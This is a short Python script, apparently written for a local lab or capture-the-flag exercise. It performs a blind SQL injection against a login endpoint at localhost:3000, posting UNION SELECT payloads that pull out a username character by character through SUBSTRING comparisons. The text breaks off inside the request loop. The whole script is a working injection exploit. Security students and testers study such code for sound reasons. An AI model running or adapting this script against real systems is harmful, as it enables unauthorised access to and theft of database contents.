import requests
import string
import time

url = 'http://localhost:3000/login'

start = time.time()

def injectsql():
    session = requests.Session()
    # define characters
    number = '0123456789'
    char = string.ascii_letters + number # alphabet uppercase and lower case
    length = 1 
    flag = ''
    # Iterate through length of username
    while length <= 10:
        # For each character compare values to find match
        for c in char:
            request = session.post(url, data={'user': f"' UNION SELECT null,SUBSTRING(username, {length}, 1) AS ExtractString FROM user WHERE SUBSTRING(username, {length},1) = '{c}' LIMIT 1#",'pass':'1234'})
            response = request.text